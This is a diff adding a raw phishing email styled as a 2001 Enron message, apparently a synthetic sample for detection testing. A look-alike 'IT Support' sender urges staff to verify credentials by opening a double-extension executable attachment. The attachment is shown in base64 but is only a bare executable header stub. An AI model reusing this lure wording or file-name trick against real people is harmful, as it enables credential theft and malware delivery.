@@ -1,0 +1,42 @@
+From: "Enron IT Support" <helpdesk@enron-security-update.com>
+To: "Stacey White" <stacey.white@enron.com>
+Subject: MANDATORY: Critical Outlook Security Patch & Account Re-Authentication
+Date: Thu, 17 May 2001 11:20:15 -0500
+Message-ID: <20010517162015.9381.patch@enron-security-update.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_98234_82910384.8291823"
+Received: from mail.enron-security-update.com (mail.enron-security-update.com [198.51.100.99])
+    by mx.enron.com (8.11.2/8.11.2) with ESMTP id f4HA9918274
+    for <stacey.white@enron.com>; Thu, 17 May 2001 11:20:17 -0500
+Authentication-Results: mx.enron.com;
+    spf=fail (sender IP 198.51.100.99 is not authorized);
+    dkim=fail
+
+------=_Part_98234_82910384.8291823
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+All Employees,
+
+We have detected suspicious login attempts on your Outlook corporate mailbox. 
+Your mailbox size has exceeded standard quota and will be suspended unless updated.
+
+Please open the attached security update package immediately to verify your account credentials:
+Attachment: Urgent_Security_Hotfix_v2.pdf.exe
+
+IT Infrastructure Security Operations Center
+Enron Corp.
+
+------=_Part_98234_82910384.8291823
+Content-Type: application/x-dosexec; name="Urgent_Security_Hotfix_v2.pdf.exe"
+Content-Disposition: attachment; filename="Urgent_Security_Hotfix_v2.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwELAQYAACAAAAAQAAAAAAAAAAAA
+AADAEAAAABAAAAAgAAAAAEAAABAAAAACAAIAAAAAAAAFAAAAAAAAAAQAAAAAAAAAAABAAAEAAAAA
+AAAAACAAAAAAAABAAAAAAAAAAAAAAAAYAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+------=_Part_98234_82910384.8291823--
